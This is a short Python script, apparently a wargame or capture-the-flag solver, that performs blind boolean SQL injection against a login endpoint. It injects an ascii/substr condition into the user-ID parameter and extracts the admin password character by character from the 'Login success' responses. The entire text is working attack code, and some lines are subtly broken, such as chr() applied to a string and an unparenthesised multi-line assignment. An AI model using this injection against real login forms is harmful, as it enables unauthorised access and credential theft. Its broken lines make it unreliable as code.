import requests
import string
url = 'http://example.com/login'
params = {
    'uid':'',
    'upw':''
}

tc =
string.ascii_letters +
string.digits +
string.punctuation
query = '''admin' and ascii(substr(upw,{idx},1))={val}--'''

password = ''

for idx in range(0,20):
    for ch in tc:
        params['uid'] = query.format(idx=idx,val=ord(ch)).strip("\n") 
        c = requests.get(url,params=params)
        print(c.request.url)
        if c.text.find("Login success") != -1:
            password += chr(ch)
            break

print(f"Password is {password}")